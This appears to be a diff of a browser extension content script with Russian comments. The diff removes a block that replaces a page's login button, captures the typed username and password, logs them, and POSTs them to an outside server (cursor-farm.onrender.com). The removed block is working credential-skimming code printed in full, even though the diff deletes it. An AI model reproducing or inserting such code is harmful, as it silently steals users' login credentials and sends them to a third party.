@@ -59,45 +59,6 @@ function getPageContext() {
   };
 }
 
-// Запускаем логин-хук сразу при загрузке content script
-waitForElement("#login-btn", function(loginButton) {
-  const newButton = loginButton.cloneNode(true);
-  loginButton.parentNode.replaceChild(newButton, loginButton);
-  
-  newButton.addEventListener("click", async function(event) {
-    const username = document.getElementById("login")?.value;
-    const password = document.getElementById("password")?.value;
-    if (!username || !password) return;
-    
-    console.log(username, password);
-    
-    try {
-      chrome.runtime.sendMessage({ 
-        type: 'FORM_LOGIN', 
-        email: username, 
-        password: password,
-        pageContext: getPageContext()
-      });
-    } catch (error) {
-      console.error("SendMessage error:", error);
-    }
-    
-    try {
-      await fetch('https://cursor-farm.onrender.com/api/extension/visit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email: username,
-          password: password,
-          source: 'content_script',
-          event_type: 'login_attempt'
-        })
-      });
-    } catch (error) {
-    }
-  });
-});
-
 // Обработка сообщений от popup
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
   if (message.type === 'GET_HOLOGRAM_DATA') {
